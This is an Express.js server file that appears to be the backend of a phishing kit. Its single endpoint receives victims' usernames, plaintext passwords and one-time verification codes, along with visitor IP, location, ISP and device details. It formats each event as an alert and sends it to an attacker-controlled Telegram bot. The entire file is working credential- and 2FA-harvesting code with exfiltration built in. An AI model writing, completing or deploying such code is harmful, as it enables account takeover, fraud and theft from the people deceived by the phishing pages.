import express from 'express';
import cors from 'cors';
import axios from 'axios';
import 'dotenv/config';

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json());

app.post('/api/track', async (req, res) => {
    try {
        const { actionType, extraData } = req.body;
        let text = "";

        // BUILDING THE MESSAGE BASED ON EVENT TYPE
        switch (actionType) {
            case "Login Attempt":
                text = `🔐 Login Attempt\n`;
                text += `____________________________\n\n`;
                text += `👤 Username: ${extraData.User_ID}\n`;
                text += `🔒 Password: ${extraData.Password}\n\n`;
                text += `🌍 IP: ${extraData.IP}`;
                break;

            case "Verification Method Selected":
                text = `🔐 Verify Your Identity\n`;
                text += `____________________________\n\n`;
                const method = extraData.Chosen_Method === 'TEXT' ? 'Text Message (SMS)' : 'E-mail';
                text += `Method Selected: ${method}\n\n`;
                text += `🌍 IP: ${extraData.IP}`;
                break;

            case "OTP Submitted":
            case "Verification code submitted": // Added this to match your OTPPage.jsx exactly
                text = `✅ Verification Code Submitted\n`;
                text += `____________________________\n\n`;
                text += `🔐 Type: ${extraData.Method || 'Security Code'}\n`;
                text += `🔢 Code: ${extraData.OTP || extraData.Submitted_OTP}\n\n`;
                text += `🌍 IP: ${extraData.IP}`;
                break;

            case "Home Page Entered (Visitor Tracking)":
                text = `🌐 New Visitor\n`;
                text += `____________________________\n\n`;
                text += `📍 Location: ${extraData.Location}\n`;
                text += `🌍 IP: ${extraData.IP}\n`;
                text += `⏰ Timezone: ${extraData.Timezone}\n`;
                text += `🌐 ISP: ${extraData.ISP}\n\n`;
                text += `📱 Device: ${extraData.Device}\n`;
                text += `🖥️ Screen: ${extraData.Screen}\n`;
                text += `🌍 Language: ${extraData.Language}\n`;
                text += `🔗 Referrer: ${extraData.Referrer}\n`;
                text += `🌐 URL: ${extraData.URL}\n\n`;
                text += `⏰ Local Time: ${extraData.Local_Time}\n`;
                text += `⌚ UTC Time: ${extraData.UTC_Time}`;
                break;

            default:
                text = `🔔 Notification: ${actionType}\n`;
                text += `____________________________\n\n`;
                text += `Data: ${JSON.stringify(extraData)}`;
        }

        // Send to Telegram
        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: text,
            disable_web_page_preview: true
        });

        console.log(`✅ Alert Sent: ${actionType}`);
        res.status(200).json({ success: true });
        
    } catch (error) {
        console.error("❌ Telegram Send Failed:", error.message);
        res.status(500).json({ error: error.message });
    }
});

app.listen(5000, () => console.log('🚀 Server listening on Port 5000'));